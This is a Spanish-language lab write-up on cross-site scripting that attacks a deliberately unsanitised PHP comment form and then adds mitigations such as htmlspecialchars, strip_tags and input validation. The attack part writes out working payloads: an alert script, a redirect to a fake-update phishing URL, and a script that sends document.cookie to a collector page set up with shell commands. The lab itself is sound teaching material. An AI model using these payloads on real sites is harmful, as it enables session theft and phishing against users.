# Explotación y mitigación de Cross-Site Scripting (XSS)

## Objetivos

> [1. Conocer las diferentes formas de ataques XSS](#1-conocer-las-diferentes-formas-de-ataques-xss)  
> [2. Realizar varios ataques XSS](#2-realizar-varios-ataques-xss)  
> [3. Implementar modificaciones al código para mitigar los ataques XSS](#3-implementar-modificaciones-al-código-para-mitigar-los-ataques-xss)  

-----

## 1. Conocer las diferentes formas de ataques XSS

Los ataques **XSS (Cross-Site Scripting)** son un tipo de vulnerabilidad en sitios web donde un atacante inyecta código malicioso (normalmente JavaScript) en una página que otros usuarios van a visitar.
El objetivo suele ser robar cookies, sesiones, datos del usuario o redirigir a sitios maliciosos.
Los tipos de ataques XSS mas comunes son:

+ ***XSS reflejado***: el script va en una URL y se ejecuta cuando el usuario accede al enlace.
+ ***XSS almacenado***: el script queda guardado en el servidor (como en un comentario) y se ejecuta cuando alguien ve la página.
+ ***XSS DOM-based***: el script se ejecuta por culpa de cómo la propia página maneja el contenido con JavaScript.


## 2. Realizar varios ataques XSS

Vamos a realizar diferentes pruebas en las que realizamos ataques de XSS a sitios inseguros:

Comenzamos creando un fichero '[comment.php](./Recursos/comment.php)' en nuestro servicio de apache con un pequeño formulario, y sin realizar ningun tipo de validación ni sanitización de la entrada:

![php1](./Imagenes/1.png)

Este código muestra un formulario donde el usuario puede ingresar un comentario en un campo de texto. Cuando el usuario envía el formulario, el comentario ingresado se muestra en la pantalla con el mensaje "Comentario publicado: [comentario]".

![php1](./Imagenes/2.png)

Si en lugar de introducir un comentario introducimos código *Javascript*, al mostrarse en la página el comentario, el navegador va a interpretar ese código:

Vamos a introducir el siguiente código:

`<script>alert('XSS ejecutado!')</script>`

El navegador lo interpreta y muestra una ventana emergente:

![php1](./Imagenes/3.png)

También podemos redirigir a una página de *Phishing* con el siguiente código:

`<script>window.location='https://fakeupdate.net/win11/'</script>`

![php1](./Imagenes/4.png)

Ahora vamos a crearnos un fichero en nuestro servicio web para que se almacenen las *coookies* de los usuarios:

```
mkdir /var/www/html/cookieStealer/
touch /var/www/html/cookieStealer/index.php
touch /var/www/html/cookieStealer/cookies.txt
chmod 777 /var/www/html/cookieStealer/cookies.txt
```
Y en el fichero ***index.php*** introducimos el código de [Este archivo](./Recursos/index.php)

Ahora si introducimos el siguiente código Javascript en el formulario:

```
<script>document.write('<img src="http://localhost/cookieStealer/index.php?cookie='+document.cookie+'">')</script>`
```
Va a mandar las cookies a nuestro fichero ***index.php***:

![php1](./Imagenes/5.png)

![php1](./Imagenes/6.png)

## 3. Implementar modificaciones al código para mitigar los ataques XSS

En este apartado vamos a realizar modificaciones en el código php del formulario, que filtren y sanitizen la entrada del usuario, para evitar estos ataques de XSS:

### filter_input() para filtrar caracteres:

Creamos el documento [comment1.php](./Recursos/comment1.php) con la función ***filter_input()*** que se encarga de filtrar caracteres problemáticos.

![php1](./Imagenes/7.png)

### htmlspecialchars() para sanitizar la entrada:

Creamos el documento [comment2.php](./Recursos/comment2.php) con la función ***htmlspecialchars()*** que se encargar de convertir los caracteres especiales en sus equivalentes entidades HTML. Para que aunque el usuario introduzca código, no sea ejecutado y sea interpretado como texto sin formato.

![php1](./Imagenes/8.png)

Hacemos la prueba de introducir código Javascript pero no lo ejecuta:

![php1](./Imagenes/9.png)

### Validar la entrada:

Creamos el documento [comment3.php](./Recursos/comment3.php), en el que agregamos una validación de entrada para que el usuario no pueda enviar comentarios vacíos o superiores a 500 caracteres.

![php1](./Imagenes/10.png)

Hacemos la prueba enviando un comentario vacío:

![php1](./Imagenes/11.png)

## Protección contra inyecciones HTML y JS (XSS)

Es posible reforzar la validación de entrada que hace *htmlspecialchars()* con *strip_tags()*, para que solo se pueda introducir texto sin etiquetas HTML.

Aunque con *strip_tags()* también es posible indicar que etiquetas si estan permitidas de la siguiente manera:

`$comment = strip_tags($_POST['comment'], '<b><i>');`

## Formulario seguro
Creamos el documento [comment4.php](./Recursos/comment4.php) con todas las mitigaciones anteriores.

![php1](./Imagenes/12.png)

Las medidas de seguridad que contiene son:

+ Uso de *filter_string_polyfill()* para eliminar caracteres nulos y etiquetas html, también las comillas simples y dobles se reemplazan por sus equivalentes html.
+ Uso de *htmlspecialchars()* que convierte los caracteres especiales en entidades html.
+ Validación de la longitud de entrada y contenido.
